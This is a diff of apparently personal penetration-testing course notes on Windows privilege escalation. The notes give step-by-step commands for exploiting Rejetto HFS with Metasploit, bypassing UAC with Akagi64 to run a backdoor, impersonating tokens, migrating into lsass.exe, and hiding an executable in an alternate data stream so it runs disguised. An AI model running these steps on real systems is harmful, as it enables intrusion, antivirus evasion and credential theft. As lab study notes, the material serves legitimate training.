@@ -270,15 +270,13 @@ Tools & Environment
   https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135 
 
 
-demo is on bases of windows 7 
-![[Pasted image 20230705183039.png]]
 goal is to elevate privileges 
 
 - the command in msf getsystem tries to elevate privileges 
-- module in msf will enumerate all vulnerabilities for windows 7: suggester (it will show which exploits you can use to elevate your privliges![[Pasted image 20230705183219.png]]
+- module in msf will enumerate all vulnerabilities for windows 7: suggester (it will show which exploits you can use to elevate your privliges
 - use the command background to put sessions in the background - type sessions to list active sessions or jobs, enter session number to go to the session you want to bring back 
-- 
--**WATCH THIS VIDEO AGAIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!** 
+
+- **WATCH THIS VIDEO AGAIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!** 
 
 
 
@@ -316,7 +314,7 @@ In order to elevate privileges by bypassing UAC, you will need access to a user 
 1. Perform an Nmap scan on the target system to gather information about open ports and services.
 2. Try to access the web server on the target system by connecting to port 80.
 3. Start up the Metasploit Framework:
-    - Search for the exploit targeting the Rejetto HTTP File Server (HFS) vulnerability, which is a lightweight web server software.
+    - Search for the exploit targeting the Rejetto HTTP File Server (HFS). 
     - Configure the exploit by setting the required options.
     - Perform basic local enumeration:
         - Retrieve system information using the `sysinfo` command.
@@ -345,24 +343,17 @@ In order to elevate privileges by bypassing UAC, you will need access to a user 
     - Upload the `backdoor.exe` file to the target system using `upload backdoor.exe`.
     - Upload the `Akagi64.exe` file from the path `/root/Desktop/tools/UACME/Akagi64.exe` using `upload /root/Desktop/tools/UACME/Akagi64.exe`.
 7. Open a new shell in Meterpreter using the `shell` command.
-    
     - Run the command `\.\\Akagi64.exe 23 c:\Temp\\backdoor.exe` to bypass UAC and execute the backdoor.
 8. Go back to the listener console window (where the Meterpreter session with higher privileges is active):
-    
-- Observe the stage being sent: Monitor the progress of the active session.
-- Run `sysinfo`: Gather system information, including details about the compromised system.
-- Run `getuid`: Check the current user ID to determine the privileges of the compromised session.
-- Gain elevated privileges using the `getprivs` command: Attempt to acquire additional privileges beyond the current level.
-- Use the `getsystem` command: This command in Meterpreter is used to escalate privileges on a compromised system. It attempts to elevate the current Meterpreter session to the highest available privilege level, typically aiming for SYSTEM-level privileges on Windows systems.
-- List the process tree using `ps`: View the running processes on the compromised system.
-- Migrate to another process using the `migrate processid` command: By migrating to another process, such as `lsass.exe` (Local Security Authority Subsystem Service), the attacker gains access to high-level privileges and sensitive security-related information. Migrating to `lsass.exe` offers advantages such as privilege elevation and persistence.
-- Check the current user ID again using `getuid`: Verify if the user ID has changed after migrating to the new process.
+	- Observe the stage being sent: Monitor the progress of the active session.
+	- Run `sysinfo`: Gather system information, including details about the compromised system.
+	- Run `getuid`: Check the current user ID to determine the privileges of the compromised session.
+	- Gain elevated privileges using the `getprivs` command: Attempt to acquire additional privileges beyond the current level.
+	- Use the `getsystem` command: This command in Meterpreter is used to escalate privileges on a compromised system. It attempts to elevate the current Meterpreter session to the highest available privilege level, typically aiming for SYSTEM-level privileges on Windows systems.
+	- List the process tree using `ps`: View the running processes on the compromised system.
+	- Migrate to another process using the `migrate processid` command: By migrating to another process, such as `lsass.exe` (Local Security Authority Subsystem Service), the attacker gains access to high-level privileges and sensitive security-related information. Migrating to `lsass.exe` offers advantages such as privilege elevation and persistence.
+	- Check the current user ID again using `getuid`: Verify if the user ID has changed after migrating to the new process.`
 
-
-
-----
-
-Lab 
 
 **UACME:**
 - Defeat Windows User Account Control (UAC) and get Administrator privileges.
@@ -372,12 +363,6 @@ Lab
 
 **Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.
 
-
-![[Pasted image 20230705234559.png]]
-
-![[Pasted image 20230706153531.png]]
-
-![[Pasted image 20230706153850.png]]
 
 
 
@@ -418,22 +403,22 @@ The Incognito Module
 Demo: 
 
 1. obtain initial access into target system
-	1. Perform nmap scan on target to check webserver on port 80 
+	1. Perform `nmap scan` on target to check webserver on port 80 
 	2. Visit in the browser and see the rejetto HTTP file server 
-2. startup mfsconsole
+2.  mfsconsole
 	1. search for rejetto module and exploit 
 	2. set default payload (windows/meterpreter/reverse_tcp)
 	3. set lhost and lport rhost 
-3. this will give you a meterpretersession 
-	 - run sysinfo 
+3. this will give you a meterpreter session 
+	 - run `sysinfo` 
 	 - migrate our meterpreter session into different process: pgrep explorer and then migrate to this id 
-	 - getuid 
+	 - `getuid` 
 		 - Local service is by default unpriviliged, run: **getprivs** to check priviliges that you have 
-		 - The SeImpersonatePrivilige can be used to impersonate other  access tokens![[Pasted image 20230706193427.png]]
+		 - The SeImpersonatePrivilige can be used to impersonate other  access tokens
 		- load incognito 
-		- list_tokens -u 
+		- `list_tokens -u` 
 		- copy the name of the first accesstoken 
-		- impersonate_token "paste name token"
+		- `impersonate_token` "paste name token"
 			- getuid 
 			- getprivs 
 			- pgrep explorer 
@@ -441,8 +426,6 @@ Demo:
 			- getprivs 
 
 When you do not find privileged access tokens -> use patato attack 
-
-![[Pasted image 20230706211910.png]]
 
 ## Alternate Data Streams 
 
@@ -454,32 +437,32 @@ When you do not find privileged access tokens -> use patato attack
 - This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file 
 - This technique is usually used to evade basic signature based AVs and Static scanning tools 
 
-demo 
+
 how to hide executable in legitimate file?
 
 - navigate to temp directory in windows 
 - open cmd: 
 	- cd Desktop 
-	-  create file: notepad test.txt 
+	-  create file: `notepad test.txt `
 	- create file and add in helloword in file 
 	- open the file that is on the desktop 
 		- properties -> details (metadata) -> delete the txt with delete 
 ![[Pasted image 20230706221313.png]]
 
-- notepad test.txt:secret.txt (hidden secret.txt file)
+- notepad `test.txt:secret.txt` (hidden secret.txt file)
 
 - WinPiece is a utility used by penetration testers to perform local enumeration on a windows system in order to identify vulnerabilities that can be exploited or vulnerabilities that can be exploited to elevate our privileges' its not something malicious but its something that you want to keep hidden as much as possible. 
-- rename the WInpiece exe to payload and move it to temp directory 
+- rename the WinPiece exe to payload and move it to temp directory 
 - navigate into temp 
-	- type payload.exe > windowslog.txt:winpiece.exe 
+	- `type payload.exe` > windowslog.txt:winpiece.exe 
 The  command `type payload.exe > windowslog.txt:winpiece.exe` reads the contents of the file `payload.exe` and redirects the output to a file named `windowslog.txt:winpiece.exe`. The resulting file will contain the contents of `payload.exe` with the specified filename `winpiece.exe` inside the `windowslog.txt` file. 
 - delete payload because its now into windpiece.exe which is stored in resource stream of windlowslogs.txt file 
 - execute the exe: start windowslog.txt:windpeas.exe 
 	- did not work? create symbolic link
 		- create symbolic link within windows directory under windows\\system32:
-			- **mklink wupdate wupdate.txt** **c:\temp\windowslog.txt:winpeas.exe** 
+			- `mklink wupdate wupdate.txt c:\temp\windowslog.txt:winpeas.exe`
 			  (when you type wupdate it will automatically execute the hidden WinPiece executable hidden within the resource stream)
-			- run with elevated session: run as administrator![[Pasted image 20230706224610.png]]
+			- run with elevated session: `run as administrator`![[Pasted image 20230706224610.png]]
 	
 
 
@@ -505,8 +488,8 @@ Windows password hashes
 - Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value
 - Authentication and verification of user credentials are facilitated by the Local Security Authority (LSA).
 - Windows versions up to Windows Server 2003 utilize two different types of hashes: 
-	- LM
-	- NTLM.
+	- `LM`
+	- `NTLM`
 - Windows **disables** LM hashing and utilizes NTLM hashing from Windows Vista onwards.
 
 SAM Database 
@@ -514,7 +497,7 @@ SAM Database
 - The SAM database file cannot be copied while the operating system is running.
 - The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process
 - In modern versions of Windows, the SAM database is encrypted with a **syskey**.
- - Note: Elevated/Administrative privileges are required to access and interact with the LSASS process.
+ - Elevated/Administrative privileges are required to access and interact with the LSASS process.
 
 LM (LanMan) 
 - LM is the default hashing algorithm used in Windows operating systems prior to NT4.0.
